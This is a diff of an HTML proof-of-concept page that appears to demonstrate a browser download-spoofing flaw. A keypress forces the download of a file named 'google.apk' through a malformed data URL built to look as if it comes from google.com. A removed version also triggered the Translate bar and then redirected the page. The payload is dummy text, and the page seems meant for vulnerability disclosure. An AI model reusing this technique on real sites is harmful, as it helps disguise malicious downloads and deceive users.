@@ -1,56 +1,42 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>POC Redirect + Translate</title>
-  <style>
-    body {
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      font-family: sans-serif;
-      font-size: 22px;
-    }
-  </style>
+  <title>Download & Fullscreen on Keypress</title>
 </head>
-
 <body>
+  <center><h2>POC by Chigorin!</h2></center>
 
-<h2>POC by Chigorin!</h2>
-<p>اضغط أي مفتاح للمتابعة</p>
+  <script>
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
+      // request fullscreen
+      //goFullScreen();
+    });
 
-<script>
-window.addEventListener('keydown', function () {
+    // Download helper
+    function Puf(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
 
-  // 1. Ganti halaman ke bahasa asing → trigger Translate bar
-  document.body.innerHTML = `
-    <h1>هذه صفحة اختبار</h1>
-    <p>جارٍ تحميل الملف… يرجى الانتظار</p>
-  `;
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
+    }
 
-  // 2. Delay agar Translate UI sempat muncul
-  setTimeout(() => {
+  </script>
+  
 
-    // 3. Trigger download (malformed data URL)
-    const a = document.createElement("a");
-    a.href = "data://google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
-    a.download = "google.apk";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-
-    // 4. Redirect SETELAH download toast muncul
-    setTimeout(() => {
-      window.location.href = "https://example.com";
-      // tujuan boleh apa saja, tidak mempengaruhi PoC
-    }, 350);
-
-  }, 300);
-
-}, { once: true });
-</script>
-
+  
 </body>
 </html>
